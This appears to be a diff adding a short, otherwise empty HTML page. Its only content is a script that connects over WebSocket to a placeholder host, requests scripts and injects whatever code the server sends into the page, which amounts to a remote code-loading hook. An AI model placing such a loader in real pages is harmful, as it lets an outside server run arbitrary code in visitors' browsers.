@@ -1,0 +1,18 @@
+<doctype html>
+<html>
+<header>
+<script type="text/javascript">
+var hostname = "HOSTHERE";
+function addScript(script){
+	var ns = document.createElement('script');
+	ns.setAttribute("type","text/javascript");
+	ns.innerHTML = script;
+	document.getElementsByTagName("head")[0].appendChild(ns);}
+var s = new WebSocket('ws://'+hostname+':8080/');
+s.onopen = function(){s.send('gimmiescripts');}
+s.onmessage = function(event){console.log(event);if (event.data.substr(0,8) == "//script"){addScript(event.data);hello();}}
+</script>
+</header>
+<body>
+</body>
+</html>
